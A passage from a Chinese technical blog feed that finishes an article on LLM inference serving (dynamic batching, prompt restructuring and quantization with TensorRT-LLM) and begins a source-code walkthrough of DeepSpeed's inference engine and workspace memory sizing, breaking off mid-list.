层</h4><p>本层是服务中一些基础的模块依赖。</p><ul><li>AsyncData，对服务中各种数据层的组件的功能封装。</li><li>TensorRT-LLM，大模型的服务底层核心的推理计算依赖于 TensorRT-LLM 的推理，TensorRT-LLM 支持 PagedKVCache、in-flight batching、attentionPlugins、Quant（量化）、TP&amp;PP（tensor 并行和 pipeline 并行）、Rope（rope 位置编码）等 feature。</li></ul><p>以上是服务的主要架构，采用该架构基本能 GPU 在服务中做到满负载的工作（凑满 batch 计算），同时可以保障服务的稳定运行。</p><h1>大模型服务性能优化篇</h1><h2 id="动态批处理-（Dynamic-Batch）">动态批处理 （Dynamic Batch）</h2><p>为了进一步提升模型推理的速度，我们仔细分析了大模型在推理过程中一些计算，从上述公式中我们可以看到，要想让推理过程中的计算密度变大，只能调大 batch_size；而 generate 过程中，每个样本的输入长度和输出长度都不太一样，必然会导致算力有浪费的情况，具体的推理过程如下图所示：</p><p><img src="/img/LLM/ali/10.webp" alt="图八：大模型 generate 生成过程示意图"></p><p>从上述的案例中可以看到，一共有 4 条样本需要进行推理，而若 GPU 最多只能一次处理 3 条样本，则共需要 9 步完成这三条样本的推理，而第 1 条样本在 step1 的时候就推理结束，input2 在 step5 的时候推理结束，因此在这 9 步推理过程中，出现很多 EOS 的 token（我们把这种叫做气泡），气泡越多，算力浪费越严重；剩余 input4 只能按 batch_size=1 进行推理，算力浪费较为严重。</p><p>在实际的推理服务中，如果一个 batch 中的其中一条输出的 output_len 很大，就可能会导致该 batch 的气泡比例可能超过 80%，就造成了算力的严重浪费，为了解决这种问题，我们提出新的推理算法，算法的逻辑如下：</p><ol><li>准备输入的数据（n = max_batch_size*10），形成一个候选集合 S</li><li>如果集合 S 为空，退出；否则，对集合 S 的文本序列排序</li><li>从集合 S 中取出 m 个文本进行推理，其中 m = find_max_batch_size(current_seq_len)，推理到一定 step（一般取 100），或者本次 batch 的 70% 的样本已推理完并且未推理完成的样本数大于 1/max_batch_size，推理中断退出。</li><li>将上次未推理完成的样本拼接上已生成的部分文本作为一个新文本，插入到候选集合 S 中，然后重复第 2 步；</li></ol><p>算法的核心思想是依据当前是 seq_len 设置每次 batch 的大小（为了让 GPU 内存占满，不造成算力的浪费），并且每次推理过程中会动态检测是否需要提前终止，终止的条件是大部分样本已完成了推理或者推理的 step 到达一定限度。针对图九中的案例，我们使用新的调度思想之后的效果如下图所示：</p><p><img src="/img/LLM/ali/11.webp" alt="图九：启用新的调度策略之后的推理"></p><p>采用新的调度逻辑后，这个案例的 step 数从原来的 20 步减少到 14 步；在实际的业务生产过程中，这个 step 的减少数远远大于案例中的 case。我们通过实践发现，在我们的业务中采用上述算法，服务的每秒查询率（QPS）一般有 2-3 倍以上的提升。</p><h2 id="优化-Prompt，提升服务性能">优化 Prompt，提升服务性能</h2><p>一般情况下，优化 prompt 可以提升模型的效果，案例如下：</p><p><img src="/img/LLM/ali/12.webp" alt=""></p><p>上述案例是让大模型判断一段文字的正确性，如果错误则说明理由。在实际服务的生产过程中，对于回答是正确的 case，输出的 token 数是 1，对于回答错误的 case，输出的 token 数可能很大，如 Dynamic Batch 一节分析的那样，当输出的长度差别很大的时候，推理过程中产生的气泡会很大，这种情况将造成严重的算力浪费。为了解决该问题，我们可以将问题进行分解，例如对大模型提问两次，第一次让大模型判断问题的正确性，第二次针对事实错误的 case 问大模型原因。</p><p><img src="/img/LLM/ali/13.webp" alt=""></p><p>在实际业务实践中，对于这类模式的问题采用上述策略，部分业务的吞吐提升 10 倍以上。</p><h2 id="模型推理量化">模型推理量化</h2><p>我们的模型量化大部分都是基于NVIDIA TensorRT Model Optimizer（简称 ModelOpt，原名 AMMO）做的。 ModelOpt 提供了简明易用的接口，可以对各种第三方模型进行训练后量化 （PTQ），并跟 TensorRT-LLM 实现良好衔接。</p><h3 id="量化原理">量化原理</h3><p>大模型的参数相对较大，占用的显存较多，并且大模型在 generate 过程中 KVCache 也需要占用大量的显存，如果对模型的参数及 KVCache 进行量化，可以显著节省显存，进而在实际服务推理过程中增大服务的 batch_size, 提升服务的吞吐量。而量化的核心是获得一个对应的缩放系数，具体公式如下：</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>R</mi><mi mathvariant="normal">/</mi><mi>S</mi><mo>+</mo><mi>Z</mi></mrow><annotation encoding="application/x-tex">Q = R/S + Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mord">/</span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span>, (Quantize)</p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi><mo>=</mo><mi>S</mi><mo>∗</mo><mo stretchy="false">(</mo><mi>Q</mi><mo>−</mo><mi>Z</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">R = S * (Q-Z)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span><span class="mclose">)</span></span></span></span>, (Dequantize)</p><ul><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>R</mi></mrow><annotation encoding="application/x-tex">R</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.00773em;">R</span></span></span></span> 表示量化前的浮点数</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"></span><span class="mord mathnormal">Q</span></span></span></span> 表示量化后的定点数</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>（Scale）表示缩放因子的数值</li><li><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Z</mi></mrow><annotation encoding="application/x-tex">Z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.07153em;">Z</span></span></span></span>（Zero）表示零点的数值</li></ul><p>如上述公式所表达的那样，模型量化的本质是将一个 FP32 或者 FP16 的数据映射到一个更低 bit 数值区间，进而减少了数据在 memory 间传输的耗时，然后基于不同的算法使用不同数据精度矩阵乘的硬件（如 Int8 的 Tensor Core），最后反量化回原来的数据精度。</p><h3 id="量化方法">量化方法</h3><p>在大模型量化实践中，我们主要尝试了对称量化的方法。</p><p><img src="/img/LLM/ali/14.webp" alt=""></p><ul><li>Int8 weight only，该方法是对一个权重矩阵求出 S (scale) 和 Z (zero) 后，然后应用上述量化公式进行量化和反量化，S 的求法为：S = max(Wi)，其中 Wi 是 W 的列向量。</li><li>Int4 weight only，该方法和 int8 weight only 类似，只不过量化的数据类型改成 int4。</li><li>SmoothQuant int8，该算法认为：常见模型的 X (或者是activation) 存在 outlier 的现象。如果使用 int8 weight only 等方式进行量化，只能利用 FP16 的 Tensor Core，不能使用 int8 的 Tensor Core，也就意味着不能使用同一硬件下的更强算力。</li><li>SmoothQuant 的方法是找出一个平滑因子，将模型计算改成：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Y</mi><mo>=</mo><mo stretchy="false">(</mo><mi>X</mi><mi>d</mi><mi>i</mi><mi>a</mi><mi>g</mi><mo stretchy="false">(</mo><mi>s</mi><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo>×</mo><mi>d</mi><mi>i</mi><mi>a</mi><mi>g</mi><mo stretchy="false">(</mo><mi>s</mi><mo stretchy="false">)</mo><mi>W</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">Y=(Xdiag(s)^{-1}\times diag(s)W)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal">d</span><span class="mord mathnormal">ia</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">ia</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mopen">(</span><span class="mord mathnormal">s</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="mclose">)</span></span></span></span>，通过使用平滑因子 s，解决掉 outlier 的数值问题，进而利用 8bit 的 TensorCore 或者 CudaCore 提升 GEMM 的性能的同时达到精度损失较小的目标。</li></ul><p><img src="/img/LLM/ali/15.webp" alt="图十：SmoothQuant 原理【4】"></p><ul><li>AWQ量化，作者通过观察发现，模型的权重不是等价重要的，在大部分场景，大概 1% 的显著权重就可以让模型保持住比较好的精度。实现方式是重要权重不量化。</li><li>GPTQ 量化，该量化思想来源于 OBQ，利用图片 的二阶导数 (hession 矩阵) 来逐步量化模型的权重 W。</li></ul><h3 id="模型量化后的性能表现">模型量化后的性能表现</h3><p>我们分别在 Baichuan2-13B 和 Qwen-14B 的模型上使用了上述各种量化方法进行实验，量化后的性能结果如下：</p><p><img src="/img/LLM/ali/16.webp" alt=""></p><p>模型推理我们基于 TensorRT-LLM 进行实现的，从实验中看，在 batch_size 和 seq_len 都相同的条件下，sq_int8 的推理速度是最快的。</p><h3 id="模型量化后的业务效果">模型量化后的业务效果</h3><p>如下是在以实际落地的两个业务说明量化的效果：</p><p><img src="/img/LLM/ali/17.webp" alt=""></p><p>我们得出的结论是，业务1 上 smoothQuant int8 表现最好，业务2 上 int8 weight only 表现更好。在我们的实践中发现，并没有哪一种方法始终是最好的，但是相对来说，smoothQuant 在大部分业务场景表现都比较稳健。某些资料表示，smoothQuant int8 对模型精度有一定影响；但在我们的应用场景下，ModelOpt 量化出来的 smoothQuant int8 精度令人满意。</p><h3 id="模型量化经验总结">模型量化经验总结</h3><ul><li>前期是不同量化方法的选择问题，我们会在标准的业务数据集上测试各种量化的效果，然后选取比较稳定的量化方法应用到实际业务中。</li><li>量化后期针对模型在实际业务中存在精度损失问题： 理论上，量化后的模型肯定做不到和未量化的模型的精度相同，但我们在实际业务中能将量化的损失控制在 1% 以内，如果精度损失过大，一般可以调整量化过程中的校准数据集，而校准样本一般 2000-8000 条，而对校准数据集的要求是分布尽可能和实际业务的样本的分布一致。</li></ul><h1>大模型工程落地的一些思考</h1><h2 id="模型性能优化总结">模型性能优化总结</h2><ul><li>Attention 是 Transformers 计算瓶颈，从Transformers 的 FLOPs 分析的最后计算公式中可以看出，Transformer 模型的主要计算是集中在 attention 计算上，过去两年，业内主要的针对 Transformer 模型的优化也集中这块，比如 FlashAttention，FlashAttention-2 等方法都是针对 attention 计算的优化。而TensorRT-LLM 中针对不同模型的 attention，基于 flash 的思想，实现了更加丰富的功能及性能的支持。</li><li>大模型推理解决第 2-n 个推理的加速问题成为最迫切的问题，过去 1 年业内提出的 flash-decoding++ 就是解决这块计算加速的问题，在 TensorRT-LLM 中是对该部分也有特定的性能优化，在此基础上，通过调大 batch_size 的方式进一步提升其吞吐量。</li><li>优化 prompt 减少推理过程中气泡也是性能有重要手段，具体问题具体分析，总体原则是，在一个 batch 推理的过程中要避免 token 无效计算。</li></ul><h2 id="模型效果优化总结">模型效果优化总结</h2><ul><li>Prompt 工程是目前大模型实际应用中非常重要的一环，prompt 设计的好坏，不仅仅影响模型的业务效果，同时也是极大的影响模型服务的吞吐量。prompt 是一个经验工程，需要开发者在实践中不断尝试和总结。</li><li>另外，prompt 的 few-shot 中的 example 的顺序也会影响模型推理的结果。</li><li>为了避免大模型没法输出预期的结果，建议开发者设计多套 prompt，逐步引导大模型正确输出，并在 prompt 中设计结束符，避免大模型出现幻觉。</li><li>对于结构化的 prompt，不推荐直接使用换行或者空格直接把各个部分分开，建议使用 markdown 语法或者 xml 语法，这个可能是大模型在预训练的时候，使用大量的 xml 和 markdown 语料训练。</li><li>Prompt 的设计需要考虑一些边界情况，例如 prompt 中可以添加这样的语句：</li></ul><p><img src="/img/LLM/ali/18.webp" alt=""></p><h1>未来计划</h1><ul><li>为了进一步提升大模型的 generate 的速度，后续将会尝试 medusa decode 等解码手段。</li><li>后续会考虑尝试使用 Attention Sink 相关 skills 在长文本中尝试。</li><li>过去 1 年一直没有在 FP8 上进行尝试，后续将会用 FP8 在实际业务中实践。</li><li>RAG 的应用，目前大模型能力有一定限制，后续将会尝试使用 RAG（检索增强）的方式提升大模型在业务中效果。</li><li>持续关注 TensorRT-LLM 最新的进展和 feature，TensorRT-LLM 这个开源项目更新迭代的频率还是挺快的，基本 2-3 个月就会有一个大版本出来。</li></ul><h2 id="感谢">感谢</h2><p>本文最后感谢我的主管和团队，以及 NVIDIA 解决方案技术团队和 GPU 计算专家团队对本文的指导。</p>]]></content>
    
    
    <categories>
      
      <category>AI</category>
      
    </categories>
    
    
    <tags>
      
      <tag>AI</tag>
      
      <tag>Transformer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入探索 deepspeed（二）</title>
    <link href="/2024/05/15/2024-5-15-deepspeed/"/>
    <url>/2024/05/15/2024-5-15-deepspeed/</url>
    
    <content type="html"><![CDATA[<h1>DeepSpeed 高性能算子实现</h1><p><a href="https://dingfen.github.io/2024/04/20/2024-4-20-deepspeed/">上篇博客</a>我罗列了 deepspeed 针对推理的优化方法，并详细分析了 deepspeed 推理引擎中对网络层的替换，张量并行等实现。那么 deepspeed 自己内部实现的高性能网络层究竟有何蹊跷，能比一般的网络层更快？让我们从源码开始看起。</p><p>注：本篇博文的源码分析基于 deepspeed-0.14.2。</p><h2 id="接上篇博客">接上篇博客</h2><p>上篇博客我们提到对于一些常见的主流大模型，deepspeed 其内部自己实现了一套高性能的代码。只要 deepspeed 检测到用户使用了这些模型，那么就会启动模型网络结构的替换功能，用高效的实现替代部分或全部网络结构。以 llama2 模型为例，<code>DeepSpeedLlama2Inference</code> 就是 deepspeed 内针对 llama2 开发的高性能推理模型。本篇博客我们来细致地研究一下 deepspeed 如何针对性地构建一个高效的大模型架构，从而提升模型的推理性能。</p><h2 id="从初始化说起">从初始化说起</h2><p>上一篇博客中其实已经谈及了很多关于 deepspeed 推理引擎的实现，因此这里我们简单地过一下：</p><p>当我们写出如下代码，并运行后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> deepspeed<br><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer, AutoModelForCausalLM<br><br>model = AutoModelForCausalLM.from_pretrained(args.model_name_or_path)<br>tokenizer = AutoTokenizer.from_pretrained(args.model_name_or_path)<br><br><span class="hljs-comment"># Initialize the DeepSpeed-Inference engine</span><br>ds_engine = deepspeed.init_inference(model,<br>                                 tensor_parallel=&#123;<span class="hljs-string">&quot;tp_size&quot;</span>: <span class="hljs-number">8</span>&#125;,<br>                                 dtype=torch.half,<br>                                 checkpoint=<span class="hljs-literal">None</span> <span class="hljs-keyword">if</span> args.pre_load_checkpoint <span class="hljs-keyword">else</span> args.checkpoint_json,<br>                                 replace_with_kernel_inject=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><p>deepspeed 的 <code>init_inference</code> 会帮助我们记录模型推理 config，并启动推理引擎 InferenceEngine。若 <code>replace_with_kernel_inject=True</code>，那么推理引擎在构建时会扫描整个模型，将其中的某些层替换为 deepspeed 内部实现的高性能网络层，从而实现加速模型推理的效果。</p><p>而对于 llama2 模型，deepspeed 甚至内部实现了整个模型，因此可以直接替换为 deepspeed 内部的 <code>DeepSpeedLlama2Inference</code> 类。具体过程见下图：</p><p><img src="/img/LLM/deepspeed_llama2_inference.png" alt=""></p><p>我们把实际运行过程中的替换模块部分的 log 信息打印出来：可以发现，每一个 <code>LlamaDecoderlayer</code> 都被替换了（博主这边是 llama-1，因此替换成了 <code>DeepSpeedGPTInference</code> 😢）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 原模型</span><br>LlamaDecoderlayer(<br>  (self_attn): LlamaAttention(<br>    (q_proj): Linear(in_features=4096, out_features=4096, bias=False)<br>    (k_proj): Linear(in_features=4096, out_features=4096, bias=False)<br>    (v_proj): Linear(in_features=4096, out_features=4096, bias=False)<br>    (o_proj): Linear(in_features=4096,out_features=4096,.bias=False)<br>    (rotary_emb): LlamaRotaryEmbedding()<br>  )<br>  (mlp):LlamaMLP(<br>    (gate_proj): Linear(in_features=4096, out_features=11008, bias=False)<br>    (up_proj): Linear(in_features=4096, out_features=11008, bias=False)<br>    (down_proj): Linear(in_features=11608, out_features=4096, bias=False)<br>    (act_Fn): SiLUActivation()<br>  )<br>  (input_layernorm): LlamaRMSNorm()<br>  (post_attention_layernorm): LlamaRMSNorm()<br>)<br><span class="hljs-comment"># 替换掉的类</span><br>&lt;class <span class="hljs-string">&#x27;deepspeed.module inject.containers.llama.LLAMALayerPolicy&#x27;</span>&gt;<br>DeepSpeedGPTInference(<br>  (attention): DeepSpeedSelfAttention(<br>    (gkv_func): QKVGemmOp()<br>    (score_context_func): SoftmaxContextop()<br>    (linear_func): Linearop()<br>    (vector_matmul_func): VectorMatMuLOp()<br>  )<br>  (mlp): DeepSpeedMLP(<br>    (mlp_gemm_func): MLPGemmOp()<br>    (vector_matmul_func): VectorMatMulOp()<br>    (fused_gemm_geTu): GELUGemmOp()<br>    (residual_add_func): ResiduaiAddOp()<br>  )<br>)<br></code></pre></td></tr></table></figure><p>明显可以观察到两点：1）deepspeed 使用 <code>DeepSpeedSelfAttention</code> 和 <code>DeepSpeedMLP</code> 替换并融合了 llama 的 Attention 和 MLP，以及 layernorm。2）deepspeed 在底层使用了自己的高性能算子，例如：<code>QKVGemmOp</code> 和 <code>MLPGemmOp</code> 等。 接下来，我们先探究 <code>DeepSpeedSelfAttention</code> 和 <code>DeepSpeedMLP</code> 的实现，再来看看这些 Op 是如何实现的。</p><h2 id="高性能网络层的实现">高性能网络层的实现</h2><p>为避免被绕晕，先将一张大致描述 deepspeed 推理代码框架图呈上：</p><p><img src="/img/LLM/deepspeed_layers.png" alt=""></p><h3 id="DeepSpeed-Inference">DeepSpeed-Inference</h3><p>从上图中可以看到，DeepSpeed Inference 实现的大模型推理类，都是 <code>DeepSpeedTransformerInference</code> 的派生类。目前为止，一共有如下几种类：</p><ul><li>DeepSpeedBloomInference</li><li>DeepSpeedBERTInference</li><li>DeepSpeedLlama2Inference</li><li>DeepSpeedGPTInference</li><li>DeepSpeedMegatronGPTInference</li><li>DeepSpeedOPTInference</li></ul><p>但大多数的推理类继承后的实现非常平凡，因此我们直接来看 <code>DeepSpeedTransformerInference</code> 实现。</p><p>首先要明确的是，<code>DeepSpeedTransformerInference</code> 对应于一个大模型的一层 transformer 层，而非整个大模型。该类支持使用 <a href="https://github.com/triton-inference-server/server">triton</a> 作后端优化推理。该类有两个关键的成员，<code>DeepSpeedMLP</code> 和 <code>DeepSpeedSelfAttention</code>。</p><h4 id="allocate-workspace">allocate workspace</h4><p>接下来我们一步步地看看它的 <code>forward</code> 实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, <span class="hljs-built_in">input</span>=<span class="hljs-literal">None</span>, input_mask=<span class="hljs-literal">None</span>, attention_mask=<span class="hljs-literal">None</span>, attn_mask=<span class="hljs-literal">None</span>, head_mask=<span class="hljs-literal">None</span>, layer_past=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        get_key_value=<span class="hljs-literal">False</span>, get_present=<span class="hljs-literal">False</span>, encoder_output=<span class="hljs-literal">None</span>, enc_dec_attn_mask=<span class="hljs-literal">None</span>, x=<span class="hljs-literal">None</span>,</span><br><span class="hljs-params">        encoder_hidden_states=<span class="hljs-literal">None</span>, encoder_attention_mask=<span class="hljs-literal">None</span>, use_cache=<span class="hljs-literal">False</span>, alibi=<span class="hljs-literal">None</span>, output_attentions=<span class="hljs-literal">False</span>,</span><br><span class="hljs-params">        layer_head_mask=<span class="hljs-literal">None</span>, past_key_value=<span class="hljs-literal">None</span>, **kwargs</span>):<br>    <span class="hljs-comment"># ... #</span><br>    input_mask = (input_mask <span class="hljs-keyword">if</span> attn_mask <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> attn_mask) <span class="hljs-keyword">if</span> attention_mask <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> attention_mask<br><br>    <span class="hljs-comment"># Allocate memory only on first layer forward</span><br>    <span class="hljs-keyword">if</span> self.config.layer_id == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> self._alloc_workspace:<br>        self.allocate_workspace(self.config.hidden_size, self.config.heads,<br>                                <span class="hljs-built_in">input</span>.size()[<span class="hljs-number">1</span>],<br>                                <span class="hljs-built_in">input</span>.size()[<span class="hljs-number">0</span>], DeepSpeedTransformerInference.layer_id, self.config.mp_size,<br>                                self.config.bigscience_bloom,<br>                                dist.get_rank() <span class="hljs-keyword">if</span> dist.is_initialized() <span class="hljs-keyword">else</span> <span class="hljs-number">0</span>, self.config.max_out_tokens,<br>                                self.config.min_out_tokens)<br>        self._alloc_workspace = <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p>这里的 <code>allocate_workspace</code> 对应了初始化时传入的分配内存空间的函数，实际上调用的是 <a href="https://github.com/microsoft/DeepSpeed/blob/v0.14.2/csrc/transformer/inference/csrc/pt_binding.cpp#L106-L129">deepspeed 包装的 C++ CUDA 实现</a>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>  <span class="hljs-comment"># ...</span><br>  <span class="hljs-keyword">if</span> config.dtype == torch.float32:<br>      self.allocate_workspace = inference_module.allocate_workspace_fp32<br>  <span class="hljs-keyword">elif</span> config.dtype == torch.bfloat16:<br>      self.allocate_workspace = inference_module.allocate_workspace_bf16<br>  <span class="hljs-keyword">else</span>:<br>      self.allocate_workspace = inference_module.allocate_workspace_fp32<br>  self._alloc_workspace = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">InferenceContext::<span class="hljs-built_in">Instance</span>().<span class="hljs-built_in">GenWorkSpace</span>(num_layers, num_heads, batch_size,<br>                                          prompt_length, hidden_dim, mp_size,<br>                                          external_cache, <span class="hljs-built_in">sizeof</span>(T), rank,<br>                                          max_out_tokens, min_out_tokens);<br></code></pre></td></tr></table></figure><p>这里提一句大模型推理所需内存的计算方法。即刨除大模型本身的参数占用内存，还需要多少内存来完成推理：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">size_t</span> activation_size = <span class="hljs-number">10</span> * (num_heads * effective_head_size) * batch_size;<br><span class="hljs-comment">// Other sequence length dimension is added when the final workSpaceSize is calculated</span><br><span class="hljs-type">size_t</span> temp_size = batch_size * (num_heads / mp_size) * max_out_tokens;<br><span class="hljs-type">size_t</span> cache_size =<br>    num_layers * batch_size * ((num_heads * effective_head_size) / mp_size) * <span class="hljs-number">2</span><br><span class="hljs-type">size_t</span> workSpaceSize = ((external_cache ? (activation_size + temp_size)<br>                                                : (activation_size + temp_size + cache_size))) *<br>                               _max_seq_len * elem_size;<br></code></pre></td></tr></table></figure><p>具体的推导步骤可以参考<strong>大模型训练时占用内存</strong>的<a href="https://zhuanlan.zhihu.com/p/648924115">知乎文章</a>。这里做简要注解：</p><ul><li>transformer 模型的层数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi></mrow><annotation encoding="application/x-tex">l</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span></li><li>隐藏层维度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>h</mi></mrow><annotation encoding="application/x-tex">h</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal">h</span></span></span></span></li><li>注意力头数为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal">a</span></span></span></span></li><li>词表大小为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>v</mi></mrow><annotation encoding="application/x-tex">v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">v</span></span></span></span></li><li>批次大小为 <span 